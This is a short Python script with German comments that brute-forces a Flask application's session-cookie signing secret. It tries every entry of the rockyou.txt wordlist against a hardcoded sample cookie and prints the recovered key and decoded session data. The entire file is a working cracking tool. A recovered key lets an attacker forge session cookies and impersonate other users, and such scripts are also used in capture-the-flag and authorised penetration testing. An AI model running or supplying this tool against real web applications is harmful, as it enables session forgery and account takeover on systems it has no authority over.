from flask import Flask
from flask.sessions import SecureCookieSessionInterface
from itsdangerous import BadSignature

# Ziel-Cookie (hier: Beispiel aus deiner App)
cookie = "eyJ1c2VyX2lkIjo4LCJ1c2VybmFtZSI6Im1vIn0.aF7Fow._sGWZzsjblZZLYDFYtWgxdvviY4"

# Flask-kompatibler Interface Wrapper
class SimpleSecureCookieSessionInterface(SecureCookieSessionInterface):
    def get_signing_serializer(self, app):
        return super().get_signing_serializer(app)

def try_keys_from_file(cookie_path: str, wordlist_path: str):
    try:
        with open(wordlist_path, encoding="utf-8", errors="ignore") as f:
            keys = [line.strip() for line in f if line.strip()]
    except FileNotFoundError:
        print(f"[!] Wordlist '{wordlist_path}' nicht gefunden.")
        return None, None

    for key in keys:
        app = Flask(__name__)
        app.secret_key = key
        interface = SimpleSecureCookieSessionInterface()
        serializer = interface.get_signing_serializer(app)

        if not serializer:
            continue

        try:
            data = serializer.loads(cookie_path)
            print(f"[+] Schlüssel gefunden: {key}")
            print(f"[+] Entschlüsselte Daten: {data}")
            return key, data
        except BadSignature:
            continue
        except Exception as e:
            print(f"[!] Fehler bei '{key}': {e}")
    print("[-] Kein Schlüssel gefunden.")
    return None, None

# Start
if __name__ == "__main__":
    try_keys_from_file(cookie, "rockyou.txt")
